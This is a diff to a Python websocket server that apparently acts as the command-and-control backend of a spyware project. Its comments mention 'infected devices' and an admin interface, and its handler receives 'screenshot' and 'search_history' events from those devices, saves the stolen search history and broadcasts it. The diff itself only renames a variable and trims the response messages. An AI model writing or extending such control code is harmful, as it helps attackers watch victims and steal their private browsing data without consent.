@@ -33,24 +33,24 @@ async def handle_client(websocket):
             try:
                 # Parse the JSON message
                 data = json.loads(client_message)
-                event = data.get("event")
+                command = data.get("event")
                 payload = data.get("payload")
-                logger.info(f"Received event: {event}")
+                logger.info(f"Received event: {command}")
                 
                 # Process the event and respond (?)
-                if event == "screenshot":
-                    response = {"event": "response", "payload": f"Screenshot received"}
-                elif event == "search_history":
-                    response = {"event": "search_history", "payload": "Search history received"}
+                if command == "screenshot":
+                    response = {"command": "response"}
+                elif command == "search_history":
+                    response = {"command": "search_history"}
                     save_search_history(payload)
 
                     # Broadcast the search history to the admin interface (this is kinda meh implementation because it also broadcasts to infected devices, 
                     # should work for now but ill look into it at some point)
-                    await broadcast({"event": "search_history", "payload": payload})
+                    await broadcast({"event": "search_history"})
 
                 #not sure if notifying clients of errors really is a great idea :D
                 else:
-                    response = {"event": "error", "payload": f"Unknown event: {event}"}
+                    response = {"event": "error"}
                 
                 # Send the JSON response back to the client
                 await websocket.send(json.dumps(response))
